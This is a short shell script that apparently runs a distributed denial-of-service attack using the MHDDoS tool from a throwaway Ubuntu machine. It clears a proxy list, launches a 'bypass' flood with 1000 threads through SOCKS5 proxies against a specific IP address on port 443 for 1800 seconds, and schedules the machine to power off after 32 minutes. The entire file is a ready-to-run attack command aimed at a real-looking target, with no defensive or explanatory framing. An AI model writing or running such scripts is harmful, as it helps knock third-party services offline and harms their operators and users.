#!/bin/sh
rm /home/ubuntu/mhddos/files/proxies/socks5.txt;
python3 /home/ubuntu/mhddos/start.py bypass 176.67.241.93:443 5 1000 socks5.txt 100000 1800 &
sudo shutdown -P +32&
